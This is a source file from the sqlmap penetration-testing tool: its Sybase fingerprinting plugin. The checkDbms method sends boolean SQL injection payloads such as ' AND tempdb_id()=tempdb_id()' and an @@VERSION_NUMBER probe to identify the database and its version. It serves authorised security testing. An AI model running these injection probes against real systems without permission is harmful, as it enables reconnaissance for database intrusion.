#!/usr/bin/env python

"""
$Id: fingerprint.py 1961 2010-10-11 13:52:32Z stamparm $

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.session import setDbms
from lib.core.settings import SYBASE_ALIASES
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "Sybase"
            return value

        actVer = formatDBMSfp()
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if conf.dbms in SYBASE_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
            setDbms("Sybase %s" % kb.dbmsVersion[0])

            self.getBanner()

            if not conf.extensiveFp:
                kb.os = "Windows"

                return True

        infoMsg = "testing Sybase"
        logger.info(infoMsg)

        if conf.direct:
            result = True
        else:
            payload = agent.fullPayload(" AND tempdb_id()=tempdb_id()")
            result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming Sybase"
            logger.info(logMsg)

            payload = agent.fullPayload(" AND suser_id()=suser_id()")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not Sybase"
                logger.warn(warnMsg)

                return False

            setDbms("Sybase")

            self.getBanner()

            if not conf.extensiveFp:
                return True
            
            for version in range(12, 16):
                randInt = randomInt()
                query   = " AND @@VERSION_NUMBER/1000=%d" % version
                payload = agent.fullPayload(query)
                result  = Request.queryPage(payload)
                if result:
                    kb.dbmsVersion = ["%d" % version]
                    break

            return True
        else:
            warnMsg = "the back-end DMBS is not Sybase"
            logger.warn(warnMsg)

            return False
